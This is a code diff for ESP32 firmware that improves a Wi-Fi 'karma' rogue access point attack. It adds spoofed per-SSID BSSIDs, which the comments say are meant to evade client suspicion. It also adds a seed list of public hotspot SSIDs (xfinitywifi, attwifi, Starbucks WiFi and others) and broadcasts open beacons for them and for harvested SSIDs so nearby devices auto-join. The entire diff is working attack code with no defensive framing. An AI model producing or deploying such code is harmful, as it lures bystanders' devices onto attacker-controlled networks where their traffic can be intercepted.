@@ -151,6 +151,34 @@ static void karma_init_bssid(void)
     s_spoof_bssid[5] = (uint8_t)(r2 >> 8);
 }
 
+/* #B4: derive a STABLE per-SSID BSSID so each fake network looks like a
+ * distinct real AP instead of one radio claiming a dozen SSIDs (which
+ * client OSes flag as suspicious and won't auto-join). FNV-1a hash of
+ * the SSID -> locally-administered MAC. Same SSID always maps to the
+ * same BSSID across beacon cycles so the "AP" looks stable over time. */
+static void karma_ssid_bssid(const char *ssid, uint8_t out[6])
+{
+    uint32_t h = 2166136261u;
+    for (const char *c = ssid; *c; ++c) { h ^= (uint8_t)*c; h *= 16777619u; }
+    out[0] = 0x02;                       /* locally administered, unicast */
+    out[1] = 0x53;                       /* 'S' marker so our fakes cluster */
+    out[2] = (uint8_t)(h >> 0);
+    out[3] = (uint8_t)(h >> 8);
+    out[4] = (uint8_t)(h >> 16);
+    out[5] = (uint8_t)(h >> 24);
+}
+
+/* #B4: sticky public-hotspot SSIDs that phones/laptops auto-join
+ * without a prompt. Broadcast alongside harvested SSIDs so passive
+ * scanners latch on even before they actively probe. Same set the
+ * portal preset list uses. */
+static const char *KARMA_SEED_SSIDS[] = {
+    "xfinitywifi", "attwifi", "Starbucks WiFi", "Google Starbucks",
+    "McDonalds Free WiFi", "Free WiFi", "Guest WiFi", "Free Public WiFi",
+    "Boingo Hotspot", "spectrum",
+};
+#define KARMA_SEED_N (sizeof(KARMA_SEED_SSIDS)/sizeof(KARMA_SEED_SSIDS[0]))
+
 /* Promiscuous RX callback. Called from WiFi driver task.
  *
  * For probe-request frames (subtype 0x4):
@@ -225,8 +253,14 @@ static void probe_cb(void *buf, wifi_promiscuous_pkt_type_t type)
         /* Fire ONE probe-response per directed probe. Bursting multiple
          * here would queue the dynamic_tx_buf pool and starve later
          * TXes (rc=257) per the wifi_deauth_frame.h investigation. */
+        /* #B4: respond with the SAME stable per-SSID BSSID the beacon
+         * loop advertises, so the client sees one consistent AP for
+         * this SSID (matching beacon + probe-resp = far more likely to
+         * auto-associate than a probe-resp from a random new BSSID). */
+        uint8_t resp_bssid[6];
+        karma_ssid_bssid(ssid, resp_bssid);
         uint8_t frame[128];
-        int len = build_probe_resp(frame, client, s_spoof_bssid,
+        int len = build_probe_resp(frame, client, resp_bssid,
                                    ssid, s_cur_channel, seq);
         esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
         if (r == ESP_OK) {
@@ -414,24 +448,38 @@ static void run_karma(void)
             ui_draw_status(radio_name(), spam_on ? "karma+" : "karma");
         }
 
-        /* Background beacon spam for every harvested SSID. Pulls in
-         * clients that scan passively rather than probing actively.
-         * Rate-limited so we don't starve the probe-response TX path. */
+        /* Background beacon spam. Pulls in clients that scan passively
+         * rather than probing actively. #B4: beacon BOTH the harvested
+         * SSIDs AND a sticky public-hotspot seed set, each with a stable
+         * per-SSID BSSID so they look like distinct real APs. */
         if (spam_on && now - last_beacon > 100) {
             last_beacon = now;
             char ssids[PROBE_MAX][33];
             int n = snapshot_unique_ssids(ssids, PROBE_MAX);
+            uint8_t bssid[6];
             for (int i = 0; i < n; ++i) {
+                karma_ssid_bssid(ssids[i], bssid);
                 uint8_t frame[128];
-                int len = build_open_beacon(frame, s_spoof_bssid, ssids[i],
+                int len = build_open_beacon(frame, bssid, ssids[i],
                                             s_cur_channel, s_resp_seq);
                 s_resp_seq = (s_resp_seq + 1) & 0x0FFF;
                 esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
                 if (r == ESP_OK) s_resp_total++;
                 else             s_resp_err++;
-                /* 2 ms inter-frame delay — drain the dynamic TX pool
-                 * between calls so rc=257 doesn't pile up. Per
-                 * wifi_deauth_frame.h:wifi_deauth_pair recipe. */
+                vTaskDelay(pdMS_TO_TICKS(2));
+            }
+            /* Sticky seed SSIDs — broadcast every cycle so a fresh
+             * client that's never probed still sees a network it
+             * auto-joins. */
+            for (size_t i = 0; i < KARMA_SEED_N; ++i) {
+                karma_ssid_bssid(KARMA_SEED_SSIDS[i], bssid);
+                uint8_t frame[128];
+                int len = build_open_beacon(frame, bssid, KARMA_SEED_SSIDS[i],
+                                            s_cur_channel, s_resp_seq);
+                s_resp_seq = (s_resp_seq + 1) & 0x0FFF;
+                esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+                if (r == ESP_OK) s_resp_total++;
+                else             s_resp_err++;
                 vTaskDelay(pdMS_TO_TICKS(2));
             }
         }
